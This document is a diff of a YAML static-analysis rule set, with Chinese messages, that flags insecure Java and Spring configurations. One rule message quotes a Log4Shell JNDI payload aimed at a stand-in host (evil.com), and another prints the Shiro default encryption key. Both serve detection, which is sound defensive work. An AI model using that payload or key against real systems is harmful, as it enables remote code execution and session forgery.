@@ -13,9 +13,9 @@ rules:
         - "*.yml"
         - "*.yaml"
         - "*.java"
-    message: "检测到 Log4j2 JNDI lookup 表达式。CVE-2021-44228 (Log4Shell)：攻击者可通过 ${jndi:ldap://evil.com/exp} 触发远程代码执行。建议升级 Log4j2 到 2.17.1+ 或设置 formatMsgNoLookups=true"
+    message: "检测到 Log4j2 JNDI lookup 表达式。CVE-2021-44228 (Log4Shell)：攻击者可通过 VAR_jndi:ldap://evil.com/exp 触发远程代码执行。建议升级 Log4j2 到 2.17.1+ 或设置 formatMsgNoLookups=true"
     severity: ERROR
-    languages: [generic, java]
+    languages: [java]
     metadata:
       category: security
       cwe: "CWE-502"
@@ -30,9 +30,9 @@ rules:
         - "*.xml"
         - "*.properties"
         - "*.java"
-    message: "检测到 Log4j2 lookup 表达式。Log4j2 支持 ${ctx:}, ${env:}, ${sys:} 等 lookup，可能导致信息泄露或 RCE。建议升级到 2.17.1+ 或禁用 lookup。"
+    message: "检测到 Log4j2 lookup 表达式。Log4j2 支持 VAR_ctx:, VAR_env:, VAR_sys: 等 lookup，可能导致信息泄露或 RCE。建议升级到 2.17.1+ 或禁用 lookup。"
     severity: WARNING
-    languages: [generic, java]
+    languages: [java]
     metadata:
       category: security
       cwe: "CWE-502"
@@ -46,7 +46,7 @@ rules:
         - "*.gradle"
     message: "检测到 Log4j2 受影响版本 (< 2.15.0)。CVE-2021-44228 (Log4Shell)：远程代码执行漏洞。建议升级到 2.17.1+。"
     severity: ERROR
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-502"
@@ -187,7 +187,7 @@ rules:
         - "*.properties"
     message: "检测到 Spring Boot Actuator 暴露所有端点。默认端点包括：heapdump(内存dump)、env(环境变量)、configprops(配置)、mappings(路由) 等敏感信息。建议仅暴露必要端点：management.endpoints.web.exposure.include=health,info"
     severity: ERROR
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-489"
@@ -204,7 +204,7 @@ rules:
         - "*.properties"
     message: "检测到 Actuator 端点设置为 unrestricted。除 shutdown/heapdump 外，其他端点默认 unrestricted。建议使用 management.endpoints.access.default=none 控制全局权限。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-489"
@@ -219,7 +219,7 @@ rules:
         - "*.properties"
     message: "检测到 Spring DevTools 开启。生产环境应禁用 DevTools，可能导致远程代码执行。"
     severity: ERROR
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-489"
@@ -234,7 +234,7 @@ rules:
         - "*.properties"
     message: "检测到管理端口与应用端口相同。建议使用独立端口：management.server.port=8081，并配置防火墙限制访问。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-489"
@@ -249,7 +249,7 @@ rules:
         - "*.properties"
     message: "检测到 Spring Banner 开启。生产环境应禁用 Banner，可能泄露 Spring 版本信息。建议设置 spring.main.banner-mode=off。"
     severity: INFO
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-200"
@@ -270,7 +270,7 @@ rules:
         - "*.java"
     message: "检测到 Shiro 默认密钥或硬编码密钥。CVE-2016-4437：攻击者可通过 rememberMe Cookie 执行任意代码。建议升级到 Shiro 1.7.0+ 并生成自定义密钥。"
     severity: ERROR
-    languages: [generic, java]
+    languages: [java]
     metadata:
       category: security
       cwe: "CWE-798"
@@ -285,7 +285,7 @@ rules:
         - "*.ini"
     message: "检测到 Shiro rememberMe 配置。请确保使用自定义密钥而非默认密钥。默认密钥：kPH+bIxk5D2deZiIxcaaaA=="
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-798"
@@ -298,7 +298,7 @@ rules:
         - "*.ini"
     message: "检测到 Shiro URL 配置使用 /** 匹配。可能导致权限绕过，建议使用精确路径匹配。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-287"
@@ -317,7 +317,7 @@ rules:
         - "*.properties"
     message: "检测到 Swagger 开启。生产环境应禁用 Swagger，避免暴露 API 接口文档。建议设置 enabled=false 或通过 profile 区分环境。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-489"
@@ -332,7 +332,7 @@ rules:
         - "*.properties"
     message: "检测到 Knife4j/Swagger 开启。生产环境应禁用，/doc.html 可能未授权访问，暴露所有 API 接口。建议设置 knife4j.enable=false。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-489"
@@ -364,7 +364,7 @@ rules:
         - "*.properties"
     message: "检测到 Druid 监控页面开启。/druid/index.html 可能未授权访问，泄露 SQL 执行记录、数据源配置等敏感信息。建议配置 IP 白名单或禁用。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-489"
@@ -379,7 +379,7 @@ rules:
         - "*.properties"
     message: "检测到 Druid 监控开启但无认证配置。建议添加：druid.stat-view-servlet.login-username 和 druid.stat-view-servlet.login-password"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-306"
@@ -394,7 +394,7 @@ rules:
         - "*.properties"
     message: "检测到 Druid 未配置 wall 防火墙过滤器。wall 过滤器可防止 SQL 注入。建议添加：druid.filters=wall,stat"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-89"
@@ -424,7 +424,7 @@ rules:
         - "pom.xml"
     message: "检测到 Fastjson 受影响版本 (< 1.2.83)。存在多个反序列化 RCE 漏洞。建议升级到 1.2.83+ 或 2.x 版本。"
     severity: ERROR
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-502"
@@ -473,7 +473,7 @@ rules:
         - "*.properties"
     message: "检测到 Nacos 配置。默认 Nacos 未启用认证，可能导致未授权访问配置中心。建议启用 nacos.core.auth.enabled=true"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-306"
@@ -488,7 +488,7 @@ rules:
         - "*.properties"
     message: "检测到 Nacos Discovery 配置。服务发现可能暴露服务信息，建议配置访问认证。"
     severity: INFO
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-306"
@@ -507,7 +507,7 @@ rules:
         - "*.properties"
     message: "检测到 Sentinel Dashboard 配置。Dashboard 默认无认证，建议配置访问认证或限制内网访问。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-306"
@@ -527,7 +527,7 @@ rules:
         - "*.xml"
     message: "检测到 Dubbo Registry 配置。注册中心（Zookeeper/Nacos）可能未授权访问，建议配置 ACL 认证。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-306"
@@ -542,7 +542,7 @@ rules:
         - "*.properties"
     message: "检测到 Dubbo 端口配置。Dubbo 服务端口暴露可能被恶意调用，建议配置防火墙或 Token 认证。"
     severity: INFO
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-489"
@@ -559,7 +559,7 @@ rules:
         - "*.xml"
     message: "检测到 Tomcat Manager 配置。默认用户名密码 tomcat/tomcat 应修改，否则可能导致 RCE。"
     severity: ERROR
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-798"
@@ -572,7 +572,7 @@ rules:
         - "server.xml"
     message: "检测到 Tomcat AJP Connector 开启。CVE-2020-1938 (Ghostcat)：AJP 协议可能导致文件读取/包含。建议禁用或配置 secretRequired。"
     severity: ERROR
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-22"
@@ -585,7 +585,7 @@ rules:
         - "web.xml"
     message: "检测到 Tomcat 目录列表开启。可能泄露敏感文件列表，建议设置 listings=false。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-538"
@@ -602,9 +602,9 @@ rules:
         - "*.yml"
         - "*.yaml"
         - "*.properties"
-    message: "检测到数据库密码明文配置。建议使用环境变量：password: ${DB_PASSWORD} 或 Jasypt 加密。"
+    message: "检测到数据库密码明文配置。建议使用环境变量：password: VAR_DB_PASSWORD 或 Jasypt 加密。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-798"
@@ -619,7 +619,7 @@ rules:
         - "*.properties"
     message: "检测到数据库连接信息明文配置。建议使用环境变量或加密存储敏感信息。"
     severity: INFO
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-798"
@@ -636,9 +636,9 @@ rules:
         - "*.yml"
         - "*.yaml"
         - "*.properties"
-    message: "检测到 Redis 配置但无密码。建议启用认证：spring.redis.password=${REDIS_PASSWORD}"
+    message: "检测到 Redis 配置但无密码。建议启用认证：spring.redis.password=VAR_REDIS_PASSWORD"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-306"
@@ -653,7 +653,7 @@ rules:
         - "*.properties"
     message: "检测到 Redis 配置。建议配置连接池以防止连接泄露：spring.redis.lettuce.pool.max-active=8"
     severity: INFO
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-400"
@@ -672,7 +672,7 @@ rules:
         - "*.properties"
     message: "检测到 Elasticsearch 认证信息明文配置。建议使用环境变量。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-798"
@@ -689,9 +689,9 @@ rules:
         - "*.yml"
         - "*.yaml"
         - "*.properties"
-    message: "检测到 MongoDB URI 明文包含认证信息。建议使用环境变量：spring.data.mongodb.uri=${MONGO_URI}"
+    message: "检测到 MongoDB URI 明文包含认证信息。建议使用环境变量：spring.data.mongodb.uri=VAR_MONGO_URI"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-798"
@@ -708,9 +708,9 @@ rules:
         - "*.yml"
         - "*.yaml"
         - "*.properties"
-    message: "检测到 RabbitMQ 密码明文配置。建议使用环境变量：spring.rabbitmq.password=${RABBITMQ_PASSWORD}"
+    message: "检测到 RabbitMQ 密码明文配置。建议使用环境变量：spring.rabbitmq.password=VAR_RABBITMQ_PASSWORD"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-798"
@@ -729,7 +729,7 @@ rules:
         - "*.properties"
     message: "检测到 Kafka 配置。建议配置 SASL 认证：spring.kafka.properties.security.protocol=SASL_PLAINTEXT"
     severity: INFO
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-306"
@@ -748,7 +748,7 @@ rules:
         - "*.properties"
     message: "检测到 MyBatis 配置。建议检查 Mapper XML 文件是否存在 ${} 注入风险。建议使用 #{} 参数绑定。"
     severity: INFO
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-89"
@@ -767,7 +767,7 @@ rules:
         - "*.properties"
     message: "检测到 JPA/Hibernate SQL 日志开启。生产环境应关闭，可能泄露敏感 SQL 信息。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-532"
@@ -782,7 +782,7 @@ rules:
         - "*.properties"
     message: "检测到 JPA ddl-auto 非安全配置。生产环境应使用 validate 或 none，避免自动修改数据库结构。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-489"
@@ -801,7 +801,7 @@ rules:
         - "*.properties"
     message: "检测到 Session Cookie Secure 属性为 false。生产环境应设置 true，防止 Cookie 被 HTTP 劫持。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-614"
@@ -816,7 +816,7 @@ rules:
         - "*.properties"
     message: "检测到 Session Cookie HttpOnly 属性为 false。应设置 true，防止 XSS 窃取 Cookie。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-79"
@@ -835,7 +835,7 @@ rules:
         - "*.properties"
     message: "检测到 XXL-JOB 配置。XXL-JOB 2.2.0-2.3.0 存在执行器未授权访问漏洞，攻击者可获取服务器权限。建议升级到 2.4.0+ 并配置 accessToken。"
     severity: ERROR
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-306"
@@ -852,7 +852,7 @@ rules:
         - "*.properties"
     message: "检测到 XXL-JOB 默认 accessToken。攻击者可使用默认 token 未授权访问执行器。建议设置自定义强随机 token。"
     severity: ERROR
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-798"
@@ -866,7 +866,7 @@ rules:
         - "*.gradle"
     message: "检测到 XXL-JOB 受影响版本 (2.2.0-2.3.0)。存在执行器未授权访问漏洞，CVE-2024-42681 子任务越权漏洞。建议升级到 2.4.1+。"
     severity: ERROR
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-287"
@@ -885,7 +885,7 @@ rules:
         - "*.properties"
     message: "检测到 Apollo 配置中心配置。Apollo < 1.6.0 默认无认证，CVE-2024-43397 权限绕过漏洞。建议升级到 2.3.0+ 并启用 apollo.accesskey.secret。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-306"
@@ -903,7 +903,7 @@ rules:
         - "*.xml"
     message: "检测到 Apollo Admin/Config Service 配置。默认端口 8080/8090 无认证，可泄露所有配置信息。建议开启 admin-service.access.control.enabled=true。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-306"
@@ -922,7 +922,7 @@ rules:
         - "*.properties"
     message: "检测到 Eureka Server 配置。Eureka 默认无认证，攻击者可获取所有服务注册信息。建议启用 Spring Security 并配置 eureka.client.service-url.defaultZone 认证。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-306"
@@ -937,7 +937,7 @@ rules:
         - "*.properties"
     message: "检测到 Eureka Client 开启。Spring Cloud Netflix Eureka Client 使用 XStream 反序列化，存在 RCE 风险。建议升级 Spring Cloud 版本或配置安全过滤器。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-502"
@@ -956,7 +956,7 @@ rules:
         - "*.properties"
     message: "检测到 Spring Cloud Gateway Actuator 开启。/actuator/gateway/routes 可泄露所有路由配置。建议禁用或限制访问。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-489"
@@ -971,7 +971,7 @@ rules:
         - "*.properties"
     message: "检测到 Spring Cloud Gateway 路由配置。请检查路由配置是否存在注入风险，如 ${} 表达式注入。建议避免从用户输入构建路由。"
     severity: INFO
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-94"
@@ -990,7 +990,7 @@ rules:
         - "*.properties"
     message: "检测到 Zuul 路由配置。Zuul 默认暴露所有服务，建议配置 zuul.ignored-services=* 并显式定义 zuul.routes。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-489"
@@ -1009,7 +1009,7 @@ rules:
         - "*.properties"
     message: "检测到 Consul 配置。Consul 默认无认证，攻击者可获取服务注册信息。建议配置 ACL token：spring.cloud.consul.discovery.acl-token"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-306"
@@ -1022,9 +1022,9 @@ rules:
         - "*.yml"
         - "*.yaml"
         - "*.properties"
-    message: "检测到 Consul Token 明文配置。建议使用环境变量：spring.cloud.consul.discovery.acl-token=${CONSUL_TOKEN}"
+    message: "检测到 Consul Token 明文配置。建议使用环境变量：spring.cloud.consul.discovery.acl-token=VAR_CONSUL_TOKEN"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-798"
@@ -1043,7 +1043,7 @@ rules:
         - "*.properties"
     message: "检测到 Zookeeper 配置。Zookeeper 默认无认证，建议启用 ACL 认证。Dubbo/Zookeeper 未授权访问可能导致服务被恶意注册/注销。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-306"
@@ -1062,7 +1062,7 @@ rules:
         - "*.properties"
     message: "检测到 RocketMQ NameServer 配置。RocketMQ NameServer 默认无认证，攻击者可获取 Topic 和 Broker 信息。建议限制内网访问。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-306"
@@ -1081,7 +1081,7 @@ rules:
         - "*.properties"
     message: "检测到 ActiveMQ 配置。ActiveMQ Console 默认端口 8161，默认密码 admin/admin。建议修改默认密码并限制访问。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-798"
@@ -1098,9 +1098,9 @@ rules:
         - "*.yml"
         - "*.yaml"
         - "*.properties"
-    message: "检测到 MinIO AccessKey/SecretKey 明文配置。建议使用环境变量：minio.access-key=${MINIO_ACCESS_KEY}"
+    message: "检测到 MinIO AccessKey/SecretKey 明文配置。建议使用环境变量：minio.access-key=VAR_MINIO_ACCESS_KEY"
     severity: ERROR
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-798"
@@ -1115,7 +1115,7 @@ rules:
         - "*.properties"
     message: "检测到 OSS/AWS AccessKey 明文配置。建议使用环境变量或 IAM 角色。"
     severity: ERROR
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-798"
@@ -1135,7 +1135,7 @@ rules:
         - "*.java"
     message: "检测到 JWT Secret 硬编码。JWT Secret 泄露可导致任意用户身份伪造。建议使用环境变量或密钥管理服务。"
     severity: ERROR
-    languages: [generic, java]
+    languages: [java]
     metadata:
       category: security
       cwe: "CWE-798"
@@ -1150,7 +1150,7 @@ rules:
         - "*.properties"
     message: "检测到弱 JWT Secret。弱密钥可被暴力破解，导致身份伪造。建议使用 256 位以上的强随机密钥。"
     severity: ERROR
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-798"
@@ -1180,9 +1180,9 @@ rules:
         - "*.yml"
         - "*.yaml"
         - "*.properties"
-    message: "检测到 OAuth2 Client Secret 明文配置。建议使用环境变量：client-secret=${OAUTH2_CLIENT_SECRET}"
+    message: "检测到 OAuth2 Client Secret 明文配置。建议使用环境变量：client-secret=VAR_OAUTH2_CLIENT_SECRET"
     severity: ERROR
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-798"
@@ -1201,7 +1201,7 @@ rules:
         - "*.properties"
     message: "检测到 GraphQL Introspection/GraphiQL 开启。生产环境应禁用，可能泄露 Schema 信息。建议设置 enabled=false。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-489"
@@ -1220,7 +1220,7 @@ rules:
         - "*.properties"
     message: "检测到 gRPC 明文传输配置。建议启用 TLS 加密通信。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-319"
@@ -1239,7 +1239,7 @@ rules:
         - "*.yaml"
     message: "检测到 WebFlux CORS 配置允许所有来源。生产环境应限制允许的域名，防止跨站请求伪造。"
     severity: WARNING
-    languages: [generic, java]
+    languages: [java]
     metadata:
       category: security
       cwe: "CWE-942"
@@ -1258,7 +1258,7 @@ rules:
         - "*.properties"
     message: "检测到 Memcached 配置。Memcached 默认无认证，建议限制内网访问或使用 SASL 认证。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-306"
@@ -1277,7 +1277,7 @@ rules:
         - "*.properties"
     message: "检测到 Solr 配置。Solr 默认无认证，CVE-2019-0192/0193 可能导致 RCE。建议启用认证并限制访问。"
     severity: WARNING
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-306"
@@ -1295,7 +1295,7 @@ rules:
         - "*.java"
     message: "检测到 Velocity 配置。Velocity 模板引擎可能导致 SSTI 漏洞。建议启用沙箱模式或使用白名单。"
     severity: WARNING
-    languages: [generic, java]
+    languages: [java]
     metadata:
       category: security
       cwe: "CWE-94"
@@ -1364,7 +1364,7 @@ rules:
         - "*.xml"
     message: "检测到 Activiti/Flowable 工作流配置。BPMN XML 可能包含外部实体引用，存在 XXE 风险。建议禁用外部实体解析。"
     severity: WARNING
-    languages: [generic, java]
+    languages: [java]
     metadata:
       category: security
       cwe: "CWE-611"
@@ -1426,7 +1426,7 @@ rules:
   
   - id: java-config-jdbc-url-injection
     patterns:
-      - pattern-regex: 'DriverManager\.getConnection\s*\(\s*[^"]|jdbc:[a-z]+://.*\$\{|setUrl\s*\(\s*[^"'
+      - pattern-regex: "DriverManager.getConnection\\s*\\("
     paths:
       include:
         - "*.java"
@@ -1447,7 +1447,7 @@ rules:
         - "*.properties"
     message: "检测到 H2 Console 开启。H2 Console 可能导致 RCE (JNDI 注入)，生产环境应禁用。建议设置 enabled=false。"
     severity: ERROR
-    languages: [generic]
+    languages: [yaml]
     metadata:
       category: security
       cwe: "CWE-489"
